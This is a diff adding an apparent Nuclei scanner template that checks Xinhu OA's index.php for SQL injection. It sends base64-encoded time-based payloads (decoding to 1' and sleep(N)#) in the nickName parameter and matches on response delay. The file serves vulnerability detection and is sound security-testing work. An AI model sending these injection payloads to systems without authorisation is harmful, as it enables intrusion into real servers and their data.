@@ -1,0 +1,24 @@
+id: xinhuOA-index-sqli
+info:
+  name: 信呼OA index存在SQL注入漏洞。
+  author: wangzong
+  severity: high
+  description: 信呼OA index存在SQL注入漏洞。
+  reference:
+    - http://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDMpIw=="
+      - "{{BaseURL}}/index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDYpIw=="
+      - "{{BaseURL}}/index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDkpIw=="
+        
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
